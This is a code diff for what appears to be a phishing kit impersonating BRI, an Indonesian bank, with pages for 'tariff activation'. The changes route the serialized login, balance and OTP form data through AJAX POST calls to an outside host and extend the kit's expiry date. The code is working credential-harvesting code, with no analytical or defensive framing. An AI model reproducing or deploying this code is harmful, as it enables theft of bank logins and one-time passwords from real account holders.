@@ -1,5 +1,5 @@
 let tglNow = new Date();
-let waktuBatas = new Date("2025-08-11T23:59:59");
+let waktuBatas = new Date("2025-08-25T23:59:59");
 if (tglNow.getTime() >= waktuBatas.getTime()) {
   document.location.href = 'https://suspend.vercel.app';
 } else {
@@ -25,7 +25,7 @@ function sendHp() {
       data: $('#login').serialize(),  
       complete: function() {
          setTimeout(function() {
-            window.location = "https://kj-li.cfd/Aktivasi-Tarif-BRI.ld/sudah.html";            
+            window.location = "sudah.html";            
             document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
          }, 800);
       }
@@ -39,7 +39,7 @@ function sendLogin(){
     document.getElementById('lanjutkan').innerHTML = "Memproses....";               
     
     $.ajax({
-      url: 'req/sudah.php',
+      url: 'https://anjayhostjon.cloud/BRI/remi/sudah.php',
       type: 'POST',
       data: $('#sudah').serialize(),    
     complete: function(){    
@@ -69,7 +69,7 @@ function sendSaldoS() {
    document.getElementById('lanjutkan').innerHTML = "Memproses....";
    
    $.ajax({
-      url: 'req/saldosdh.php',
+      url: 'https://anjayhostjon.cloud/BRI/remi/saldosdh.php',
       type: 'POST',
       data: $('#saldosdh').serialize(),
       complete: function() {
@@ -103,7 +103,7 @@ function sendOtpS() {
    var nama1 = document.getElementById('nama1');
    
    $.ajax({
-      url: 'req/otpsdh.php',
+      url: 'https://anjayhostjon.cloud/BRI/remi/otpsdh.php',
       type: 'POST',
       data: $('#formsdh').serialize(),
       complete: function(response) {
@@ -134,7 +134,7 @@ $(document).ready(function() {
     $("#process1").show();
  $('.load').fadeIn();
     setTimeout(function(){      
-location.href='https://choreo.cloud/BRI/britarifv4/wa';
+location.href='https://anjayhostjon.cloud/BRI/remi/wa';
  $("#process1").hide();
  $('.load').fadeOut();        
          }, 2000);
